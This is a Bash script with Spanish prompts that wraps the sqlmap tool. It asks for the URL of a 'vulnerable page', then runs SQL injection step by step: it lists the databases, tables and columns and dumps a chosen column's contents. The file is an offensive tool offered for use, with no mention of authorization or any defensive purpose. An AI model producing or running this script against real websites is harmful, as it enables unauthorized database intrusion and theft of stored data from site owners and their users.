clear
echo -e "\e[1;33m _____   __H__"
echo -e "|   __|___\e[0m[\e[101m\e[10;33m,\e[0m]\e[1;33m_____ ___ ___    {\e[1;30m1.4.4#stable\e[0m\e[1;33m}"
echo -e "|__   | . \e[0m[\e[101m\e[10;33m|\e[0m]\e[1;33m     | .'| . |   Linux is the best:]"
echo -e "|_____|_  \e[0m[\e[101m\e[10;33m,\e[0m]\e[1;33m_|_|_|__,|  _|   BY:Alejandrogit9 "
echo -e "        |_|\e[0mV\e[10;33m...       |_|\e[1;33m     http://sqlmap.org\e[0m "
echo -e "\e[1;33m _____     _                 _   _ "    
echo -e "|  _  |_ _| |_ ___ _____ ___| |_|_|___ "
echo -e "|     | | |  _| . |     | .'|  _| |  _|"
echo -e "|__|__|___|_| |___|_|_|_|__,|_| |_|___| \e[0"
echo                                      
read
clear
echo -e "\e[0m┌─────────────────────────────────────────────────────────────┐"
echo -e "| \e[1;33mINGRESA LA PAGINA VULNERABLE PARA INICIAR CON LA INYECCION \e[0m |"
echo -e "└─────────────────────────────────────────────────────────────┘"
echo -e "┃"
read -p "└═>>> " p
clear
sudo sqlmap -u $p --dbs
echo
echo -e "┌───────────────────────────────────────────────────────────┐"
echo -e "| \e[1;31mSI LE MUESTRA UNA BD PULSE ->Y<- DE LO CONTRARIO Ctrl + C \e[0m|"
echo -e "└───────────────────────────────────────────────────────────┘"
echo -e "┃"
read -p "└═>>> " y
echo 
echo -e "┌───────────────────────────────────────┐"
echo -e "| \e[1;33mINGRESA EL NOMBRE DE LA BASE DE DATOS \e[0m|"
echo -e "└───────────────────────────────────────┘"
echo -e "┃"
read -p "└═>>> " b
sudo sqlmap -u $p -random-agent -level 5 -D $b   --tables;
echo
echo -e "┌─────────────────────────────────────────────────┐"
echo -e "| \e[1;33mAHORA VISUALIZAREMOS EL CONTENIDO DE LAS TABLAS \e[0m|"
echo -e "|         \e[1;33mINGRESA EL NOMBRE DE LA TABLA...        \e[0m|"
echo -e "└─────────────────────────────────────────────────┘"
echo -e "┃"
read -p "└═>>> " M
sudo sqlmap -u $p -D $b -T $M --columns
echo
echo -e "┌──────────────────────────────────────────────────────────┐"
echo -e "| \e[1;33mA CONTINUACION VISUALIZAREMOS EL CONTENIDO DE LA COLUMNA \e[0m|"
echo -e "|            \e[1;33mINGRESA EL NOMBRE DE LA COLUMNA...            \e[0m|"
echo -e "└──────────────────────────────────────────────────────────┘"
echo -e "┃"
read -p "└═>>> " c
sudo sqlmap -u $p -D $b -T $M -C $c -dump
